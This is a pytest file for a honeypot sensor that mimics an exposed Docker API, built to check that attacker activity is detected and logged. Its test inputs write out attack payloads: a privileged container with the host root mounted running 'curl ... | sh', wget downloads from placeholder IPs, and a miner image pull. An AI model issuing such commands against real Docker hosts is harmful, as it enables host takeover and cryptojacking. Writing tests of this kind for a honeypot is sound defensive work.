"""Protocol tests against the running sensor (raw sockets; real clients are in blackbox.sh)."""

from __future__ import annotations

import asyncio
import json

from conftest import Harness, parse_response, start


async def test_ping_get_and_head(harness: Harness) -> None:
    status, headers, body = await harness.http("GET", "/_ping")
    assert (status, body) == (200, b"OK")
    assert headers["Api-Version"] == "1.47"
    assert headers["Server"] == "Docker/27.3.1 (linux)"
    assert headers["Swarm"] == "inactive"
    assert headers["Content-Type"] == "text/plain; charset=utf-8"
    status, headers, body = await harness.http("HEAD", "/_ping")
    assert status == 200 and body == b""


async def test_version_and_info(harness: Harness) -> None:
    for prefix in ("", "/v1.47", "/v1.41"):
        status, headers, body = await harness.http("GET", f"{prefix}/version")
        assert status == 200
        doc = json.loads(body)
        assert doc["Version"] == "27.3.1" and doc["ApiVersion"] == "1.47"
        assert headers["Content-Type"] == "application/json"
    status, _, body = await harness.http("GET", "/v1.47/info")
    info = json.loads(body)
    assert info["OperatingSystem"].startswith("Ubuntu 24.04.") and info["OperatingSystem"].endswith(
        " LTS"
    )
    assert info["ServerVersion"] == "27.3.1" and info["Name"] == "srv-app02"
    assert info["NCPU"] in (4, 8)
    assert info["Containers"] == len(json.loads((await harness.http("GET", "/containers/json"))[2]))


async def test_version_bounds(harness: Harness) -> None:
    status, _, body = await harness.http("GET", "/v1.99/info")
    assert status == 400 and b"too new" in body
    status, _, body = await harness.http("GET", "/v1.20/info")
    assert status == 400 and b"too old" in body
    status, _, body = await harness.http("GET", "/v1x/info")
    assert status == 404 and json.loads(body) == {"message": "page not found"}


async def test_lists_and_unknown(harness: Harness) -> None:
    _, _, body = await harness.http("GET", "/images/json")
    assert any("nginx" in t for img in json.loads(body) for t in img["RepoTags"])
    status, _, body = await harness.http("GET", "/nope")
    assert status == 404 and json.loads(body) == {"message": "page not found"}
    for path in ("/swarm", "/nodes", "/services"):
        status, _, body = await harness.http("GET", path)
        assert status == 503 and b"not a swarm manager" in body


async def test_create_start_exec_flow(harness: Harness) -> None:
    await harness.http("POST", "/images/create?fromImage=alpine")
    spec = {
        "Image": "alpine",
        "Cmd": ["chroot", "/host", "sh", "-c", "curl http://203.0.113.9/x.sh | sh"],
        "HostConfig": {"Binds": ["/:/host"], "Privileged": True, "PidMode": "host"},
    }
    status, _, body = await harness.http("POST", "/v1.47/containers/create?name=job1", spec)
    assert status == 201
    cid = json.loads(body)["Id"]
    assert len(cid) == 64 and all(c in "0123456789abcdef" for c in cid)
    status, _, _ = await harness.http("POST", "/containers/create?name=job1", spec)
    assert status == 409
    assert (await harness.http("POST", f"/containers/{cid}/start"))[0] == 204
    _, _, body = await harness.http("GET", f"/containers/{cid}/json")
    assert json.loads(body)["HostConfig"]["Privileged"] is True
    status, _, body = await harness.http(
        "POST",
        "/containers/job1/exec",
        {"Cmd": ["wget", "http://198.51.100.7/m"], "AttachStdout": True},
    )
    assert status == 201
    eid = json.loads(body)["Id"]
    status, _, _ = await harness.http("POST", f"/exec/{eid}/start", {"Detach": False})
    assert status == 200
    assert (await harness.http("DELETE", f"/containers/{cid}"))[0] == 409
    assert (await harness.http("DELETE", f"/containers/{cid}?force=1"))[0] == 204
    assert (await harness.http("POST", "/containers/ffffffffffff/start"))[0] == 404

    cmds = await harness.events("command")
    assert [c.data["kind"] for c in cmds] == ["container_create", "container_create", "exec"]
    first = cmds[0].data
    assert first["input"].startswith("chroot /host sh -c curl http://203.0.113.9/x.sh")
    assert {"container_create", "privileged", "host_mount", "pid_host", "image:alpine"} <= set(
        first["flags"]
    )
    downloads = await harness.events("download_attempt")
    urls = [d.data["url"] for d in downloads]
    assert "http://203.0.113.9/x.sh" in urls and "http://198.51.100.7/m" in urls
    reqs = await harness.events("http_request")
    create = next(
        r for r in reqs if r.data["route"] == "containers/create" and r.data["status"] == 201
    )
    assert "privileged" in create.data["flags"] and create.data["container"]["privileged"] is True


async def test_miner_flag_and_pull(harness: Harness) -> None:
    status, headers, body = await harness.http(
        "POST", "/images/create?fromImage=evil.example.net/x/xmrig&tag=6.0"
    )
    assert status == 200 and headers["Transfer-Encoding"] == "chunked"
    lines = [json.loads(x) for x in body.split(b"\r\n") if x]
    assert (
        lines[0]["status"].startswith("Pulling from")
        and "Downloaded newer image" in lines[-1]["status"]
    )
    reqs = await harness.events("http_request")
    flags = set(reqs[-1].data["flags"])
    assert {"image_pull", "miner", "custom_registry", "image:evil.example.net/x/xmrig:6.0"} <= flags


async def test_auth_records_credentials(harness: Harness) -> None:
    status, _, _ = await harness.http(
        "POST", "/auth", {"username": "admin", "password": "hunter2", "serveraddress": "r.example"}
    )
    assert status == 401
    logins = await harness.events("login_attempt")
    assert logins[0].data["username"] == "admin" and logins[0].data["password"] == "hunter2"


async def test_garbage_and_tls_hello(harness: Harness) -> None:
    raw = await harness.raw(
        b"\x16\x03\x01\x02\x00\x01\x00\x01\xfc\x03\x03" + b"A" * 40 + b"\r\n\r\n"
    )
    assert raw.startswith(b"HTTP/1.1 400 Bad Request")
    scans = await harness.events("scan")
    assert scans[0].data["kind"] == "non_http" and scans[0].data["tls_client_hello"] is True
    raw = await harness.raw(b"GET / HTTP/1.1\r\n\r\n")
    assert raw.startswith(b"HTTP/1.1 400")
    assert b"honeypot" not in raw.lower()


async def test_bad_json_and_deep_json(harness: Harness) -> None:
    status, _, body = await harness.http("POST", "/containers/create", b"{not json")
    assert status == 400
    deep = b'{"Image":"a","x":' + b"[" * 5000 + b"]" * 5000 + b"}"
    status, _, body = await harness.http("POST", "/containers/create", deep)
    assert status == 400
    status, _, body = await harness.http("POST", "/containers/create", b"")
    assert status == 400 and b"config cannot be empty" in body


async def test_keepalive_and_pipelining(harness: Harness) -> None:
    req = b"GET /_ping HTTP/1.1\r\nHost: x\r\n\r\n"
    raw = await harness.raw(
        req * 3 + b"GET /_ping HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n"
    )
    assert raw.count(b"HTTP/1.1 200 OK") == 4


async def test_chunked_request_body(harness: Harness) -> None:
    await harness.http("POST", "/images/create?fromImage=alpine")
    body = json.dumps({"Image": "alpine", "Cmd": ["id"]}).encode()
    chunks = b"".join(
        f"{len(body[i : i + 7]):x}\r\n".encode() + body[i : i + 7] + b"\r\n"
        for i in range(0, len(body), 7)
    )
    raw = await harness.raw(
        b"POST /containers/create HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked\r\n"
        b"Connection: close\r\n\r\n" + chunks + b"0\r\n\r\n"
    )
    status, _, out = parse_response(raw)
    assert status == 201


async def test_big_body_is_capped_not_kept(harness: Harness) -> None:
    big = b"A" * (1024 * 1024)
    status, _, _ = await harness.http("POST", "/build?remote=http://203.0.113.5/Dockerfile", big)
    assert status == 200
    reqs = await harness.events("http_request")
    assert reqs[-1].data["body_length"] == len(big) and reqs[-1].data["body_truncated"] is True
    assert len(reqs[-1].data["body_preview"]) <= 2500
    dl = await harness.events("download_attempt")
    assert dl[-1].data["url"] == "http://203.0.113.5/Dockerfile"


async def test_per_ip_cap_and_loopback_quiet() -> None:
    async with start({"max_per_ip": 2}) as h:
        conns = [await asyncio.open_connection("127.0.0.1", h.port) for _ in range(5)]
        await asyncio.sleep(0.3)
        assert h.sensor.rejected == 3
        for _, w in conns:
            w.close()
    async with start({"quiet_loopback": True}) as h:
        assert (await h.http("GET", "/_ping"))[0] == 200
        assert await h.events() == []


async def test_disconnect_event(harness: Harness) -> None:
    await harness.http("GET", "/version")
    ev = await harness.events("disconnect")
    assert ev[0].data["requests"] == 1 and ev[0].data["statuses"] == {"200": 1}
    conn = await harness.events("connect")
    assert conn[0].dst_port == 2375 and conn[0].sensor == "docker"


async def test_attach_hijack(harness: Harness) -> None:
    await harness.http("POST", "/images/create?fromImage=alpine")
    spec = {"Image": "alpine", "Cmd": ["echo", "hello"]}
    cid = json.loads((await harness.http("POST", "/containers/create", spec))[2])["Id"]
    raw = await harness.raw(
        f"POST /containers/{cid}/attach?stream=1&stdout=1 HTTP/1.1\r\nHost: x\r\n"
        "Connection: Upgrade\r\nUpgrade: tcp\r\n\r\n".encode()
    )
    assert raw.startswith(b"HTTP/1.1 101 UPGRADED")
    assert raw.endswith(b"\x01\x00\x00\x00\x00\x00\x00\x06hello\n")


async def test_worst_case_create_fits_the_event_schema(harness: Harness) -> None:
    await harness.http("POST", "/images/create?fromImage=" + "i" * 256)
    spec = {
        "Image": "i" * 5000,
        "Cmd": ["c" * 3000] * 20,
        "Entrypoint": ["e" * 3000] * 20,
        "Env": ["E" * 1500 + "=" + "v" * 1500] * 20,
        "HostConfig": {"Binds": ["/:" + "b" * 3000] * 20, "CapAdd": ["x" * 500] * 20},
    }
    status, _, _ = await harness.http(
        "POST",
        "/containers/create?name=a&" + "q=" + "z" * 6000,
        spec,
        headers={f"X-{i}": "h" * 900 for i in range(25)},
    )
    assert status == 201
    events = await harness.events()
    assert harness.sink.invalid == 0
    http = next(e for e in events if e.type == "http_request" and e.data["status"] == 201)
    assert isinstance(http.data["flags"], list) and "container_create" in http.data["flags"]
    assert http.data["container"]["image"].startswith("iii")
    cmd = next(e for e in events if e.type == "command")
    assert cmd.data["input"].startswith("eee") and cmd.data["flags"]
    for e in events:
        assert len(json.dumps(e.data)) <= 16 * 1024
        assert "[truncated]" not in json.dumps(e.data)


async def test_expect_continue_and_registry_auth_header(harness: Harness) -> None:
    await harness.http("POST", "/images/create?fromImage=alpine")
    import base64

    auth = base64.urlsafe_b64encode(
        json.dumps({"username": "bot", "password": "pw1", "serveraddress": "r.example"}).encode()
    ).decode()
    reader, writer = await asyncio.open_connection("127.0.0.1", harness.port)
    body = b'{"Image":"alpine","Cmd":["id"]}'
    writer.write(
        b"POST /containers/create HTTP/1.1\r\nHost: x\r\nExpect: 100-continue\r\n"
        + f"X-Registry-Auth: {auth}\r\nContent-Length: {len(body)}\r\n\r\n".encode()
    )
    assert (await asyncio.wait_for(reader.readuntil(b"\r\n\r\n"), 2)).startswith(
        b"HTTP/1.1 100 Continue"
    )
    writer.write(body)
    assert (await asyncio.wait_for(reader.read(100), 2)).startswith(b"HTTP/1.1 201")
    writer.close()
    status, _, _ = await harness.http(
        "POST", "/images/create?fromImage=alpine", headers={"X-Registry-Auth": auth}
    )
    assert status == 200
    logins = await harness.events("login_attempt")
    assert logins[0].data["username"] == "bot" and logins[0].data["password"] == "pw1"


async def test_unparsable_create_is_still_scanned(harness: Harness) -> None:
    deep = b'{"Cmd":["wget http://203.0.113.77/xmrig"],"x":' + b"[" * 5000 + b"]" * 5000 + b"}"
    status, _, _ = await harness.http("POST", "/containers/create", deep)
    assert status == 400
    reqs = await harness.events("http_request")
    assert {"miner", "unparsed_body"} <= set(reqs[-1].data["flags"])
    dl = await harness.events("download_attempt")
    assert dl[-1].data["url"] == "http://203.0.113.77/xmrig"


async def test_auto_remove_container_disappears_after_wait(harness: Harness) -> None:
    await harness.http("POST", "/images/create?fromImage=alpine")
    spec = {"Image": "alpine", "Cmd": ["true"], "HostConfig": {"AutoRemove": True}}
    cid = json.loads((await harness.http("POST", "/containers/create", spec))[2])["Id"]
    await harness.http("POST", f"/containers/{cid}/start")
    _, _, body = await harness.http("GET", "/containers/json?all=1")
    assert cid in body.decode()
    assert (await harness.http("POST", f"/containers/{cid}/wait"))[0] == 200
    _, _, body = await harness.http("GET", "/containers/json?all=1")
    assert cid not in body.decode()


async def test_docker_run_rm_waits_before_start(harness: Harness) -> None:
    """The CLI sends attach, wait, then start for `docker run --rm`; none of them may 404."""
    await harness.http("POST", "/images/create?fromImage=alpine")
    spec = {"Image": "alpine", "Cmd": ["true"], "HostConfig": {"AutoRemove": True}}
    cid = json.loads((await harness.http("POST", "/containers/create", spec))[2])["Id"]
    assert (await harness.http("POST", f"/containers/{cid}/wait"))[0] == 200
    assert (await harness.http("POST", f"/containers/{cid}/wait"))[0] == 200
    assert (await harness.http("POST", f"/containers/{cid}/start"))[0] == 204
    assert (await harness.http("DELETE", f"/containers/{cid}"))[0] == 404


async def test_unpulled_image_is_404_until_pulled(harness: Harness) -> None:
    spec = {"Image": "evil/tool", "Cmd": ["true"]}
    status, _, body = await harness.http("POST", "/containers/create", spec)
    assert status == 404 and b"No such image: evil/tool:latest" in body
    await harness.http("POST", "/images/create?fromImage=evil/tool")
    assert (await harness.http("POST", "/containers/create", spec))[0] == 201
    _, _, listing = await harness.http("GET", "/images/json")
    assert b"evil/tool:latest" in listing


async def test_old_api_version_without_minor_is_rejected_like_dockerd(harness: Harness) -> None:
    status, _, body = await harness.http("GET", "/v1/info")
    assert status == 400 and b"client version 1 is too old" in body


async def test_oversized_head_is_a_go_style_431(harness: Harness) -> None:
    raw = await harness.raw(b"GET /" + b"a" * 9000 + b" HTTP/1.1\r\nHost: x\r\n\r\n")
    assert raw.startswith(b"HTTP/1.1 431") and raw.endswith(b"431 Request Header Fields Too Large")
    raw = await harness.raw(b"BAD\r\n\r\n")
    assert raw.startswith(b"HTTP/1.1 400") and raw.endswith(b"400 Bad Request")


async def test_unknown_route_has_the_daemon_headers(harness: Harness) -> None:
    status, headers, body = await harness.http("GET", "/nope")
    assert status == 404 and body == b'{"message":"page not found"}\n'
    assert {"Api-Version", "Docker-Experimental", "Ostype", "Server"} <= set(headers)


async def test_events_stream_stays_open_then_ends() -> None:
    from conftest import start

    async with start({"events_hold": 1.0}) as h:
        t0 = asyncio.get_running_loop().time()
        raw = await h.raw(b"GET /events HTTP/1.1\r\nHost: x\r\n\r\n", wait=3.0)
        assert raw.startswith(b"HTTP/1.1 200")
        assert asyncio.get_running_loop().time() - t0 >= 0.9


async def test_common_images_exist_locally_and_create_is_recorded(harness: Harness) -> None:
    for image in (
        "alpine",
        "ubuntu:22.04",
        "busybox:latest",
        "debian:bookworm",
        "docker.io/library/alpine",
    ):
        spec = {"Image": image, "Cmd": ["sh", "-c", "wget http://203.0.113.8/x.sh"]}
        assert (await harness.http("POST", "/containers/create", spec))[0] == 201, image
    _, _, listing = await harness.http("GET", "/images/json")
    assert b"alpine:latest" in listing and b"ubuntu:22.04" in listing
    assert (await harness.http("GET", "/images/alpine/json"))[0] == 200
    # An unknown image is a 404, but the attempt (with its command) is still an event.
    spec = {"Image": "evil/miner", "Cmd": ["sh", "-c", "wget http://203.0.113.9/m"]}
    assert (await harness.http("POST", "/containers/create", spec))[0] == 404
    cmds = await harness.events("command")
    assert any(c.data["image"] == "evil/miner" for c in cmds)
    assert sum(1 for c in cmds if c.data["image"] != "evil/miner") == 5


async def test_held_event_streams_are_capped() -> None:
    async with start({"events_hold": 3.0, "held_streams_per_ip": 2, "max_per_ip": 8}) as h:
        req = b"GET /events HTTP/1.1\r\nHost: x\r\n\r\n"
        t0 = asyncio.get_running_loop().time()
        res = await asyncio.gather(*[h.raw(req, wait=4.0) for _ in range(5)])
        times = sorted(asyncio.get_running_loop().time() - t0 for _ in res)
        assert all(r.startswith(b"HTTP/1.1 200") for r in res)
        assert h.sensor.held == 0 and not h.sensor.held_per_ip
        # Only two of the five were held for the full 3 s; the rest ended at once.
        quick = sum(1 for r in res if r.endswith(b"0\r\n\r\n"))
        assert quick >= 3


async def test_unnamed_creates_never_clash_on_the_generated_name(harness: Harness) -> None:
    spec = {"Image": "alpine", "Cmd": ["true"]}
    for _ in range(40):
        assert (await harness.http("POST", "/containers/create", spec))[0] == 201
